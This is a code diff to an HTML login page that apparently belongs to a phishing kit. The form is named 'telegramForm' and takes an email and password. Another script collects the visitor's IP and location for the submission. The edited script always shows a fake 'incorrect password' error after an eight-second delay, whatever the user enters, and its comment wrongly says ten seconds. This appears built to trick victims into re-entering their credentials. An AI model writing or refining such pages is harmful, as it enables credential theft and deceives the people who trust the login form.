@@ -331,52 +331,42 @@ input[type="submit"]:hover, input[type="submit"]:focus {
     </script>
     
   
-  <script>
-    (function() {
-      const form = document.getElementById('telegramForm');
-      const pwd = document.getElementById('message');
-      const errorBanner = document.getElementById('errorBanner');
-  
-      // Show error banner (simulate incorrect password)
-      function showError() {
-        errorBanner.style.display = 'block';
-        // focus password for convenience
-        pwd.focus();
-      }
-  
-      // Hide error banner
-      function hideError() {
-        if (errorBanner.style.display !== 'none') {
-          errorBanner.style.display = 'none';
+    <script>
+      (function() {
+        const form = document.getElementById('telegramForm');
+        const pwd = document.getElementById('message');
+        const errorBanner = document.getElementById('errorBanner');
+      
+        function showError() {
+          errorBanner.style.display = 'block';
+          pwd.focus();
         }
-      }
-  
-      // On submit, prevent actual submit and show the error banner
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-  
-        // Example logic: if password is empty or short, show banner
-        // You can replace this block with real server validation instead.
-        const pw = pwd.value.trim();
-        if (!pw || pw.length < 6) {
-          showError();
-          return;
+      
+        function hideError() {
+          if (errorBanner.style.display !== 'none') {
+            errorBanner.style.display = 'none';
+          }
         }
-  
-        // Simulate server response: treat as incorrect password
-        showError();
-  
-        // If you want to actually submit to a server, do an AJAX request and
-        // show the banner based on the server response.
-      });
-  
-      // Hide the banner as soon as user starts typing in the password field
-      pwd.addEventListener('input', hideError);
-  
-      // Also hide when they change email/username (optional)
-      document.getElementById('email').addEventListener('input', hideError);
-    })();
-  </script>
+      
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+      
+          const pw = pwd.value.trim();
+      
+          // Hide old error
+          hideError();
+      
+          // Delay 10 seconds (10,000ms)
+          setTimeout(() => {
+            // Only show error after the timer
+            showError();
+          }, 8000);
+        });
+      
+        pwd.addEventListener('input', hideError);
+        document.getElementById('email').addEventListener('input', hideError);
+      })();
+      </script>
   <script>
     // Fetch user's IP and location info and store for use in form submission
     function getUserRegion() {
@@ -459,4 +449,5 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   </script>
   </body>
   </html>
+
 
